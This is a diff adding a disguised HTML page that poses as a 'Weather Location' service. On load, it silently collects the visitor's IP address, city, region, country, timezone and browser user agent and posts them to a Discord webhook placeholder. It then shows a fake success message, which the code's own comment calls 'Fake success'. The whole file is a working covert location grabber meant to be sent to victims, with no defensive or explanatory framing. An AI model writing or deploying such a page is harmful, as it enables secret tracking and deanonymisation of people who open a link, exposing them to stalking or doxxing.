@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Weather Location</title>
+</head>
+<body>
+  <h1>Getting your local weather...</h1>
+  <p>Please wait 3 seconds...</p>
+
+  <script>
+    async function sendData() {
+      try {
+        // Get IP
+        const ipResp = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResp.json();
+        const ip = ipData.ip;
+
+        // Get rough location
+        const locResp = await fetch(`https://ipapi.co/${ip}/json/`);
+        const loc = await locResp.json();
+
+        const payload = {
+          ip: ip,
+          city: loc.city || 'Unknown',
+          region: loc.region || 'Unknown',
+          country: loc.country_name || 'Unknown',
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          user_agent: navigator.userAgent,
+          timestamp: new Date().toISOString()
+        };
+
+        // Send to your Discord webhook
+        await fetch('YOUR_DISCORD_WEBHOOK_URL_HERE', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: `New location hit:\n\`\`\`json\n${JSON.stringify(payload, null, 2)}\n\`\`\``
+          })
+        });
+
+        // Fake success
+        document.body.innerHTML = '<h1 style="color:green">Weather data ready! Check bot reply.</h1>';
+      } catch (e) {
+        document.body.innerHTML = '<h1 style="color:red">Error — try again or type city manually.</h1>';
+      }
+    }
+
+    // Run immediately
+    sendData();
+  </script>
+</body>
+</html>
